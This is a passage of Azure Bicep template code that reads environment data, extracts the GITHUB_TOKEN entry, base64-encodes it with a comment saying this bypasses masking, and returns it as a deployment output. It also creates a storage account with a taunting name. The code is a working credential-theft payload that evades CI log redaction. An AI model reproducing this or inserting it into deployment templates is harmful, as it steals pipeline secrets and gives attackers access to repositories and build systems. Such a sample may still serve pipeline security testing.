var envArray = split(envContent, '\u0000')
  var tokenEntries = filter(envArray, entry => contains(entry, 'GITHUB_TOKEN'))
  var tokenValue = !empty(tokenEntries) ? tokenEntries[0] : 'NOT_FOUND'

  // Base64 encode to bypass masking
  var encoded = base64(tokenValue)

  param location string = 'eastus'

  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
    name: 'yourbaseisnowbelongtous'
    location: location
    sku: { name: 'Standard_LRS' }
    kind: 'StorageV2'
  }

  output TOKEN_BASE64 string = encoded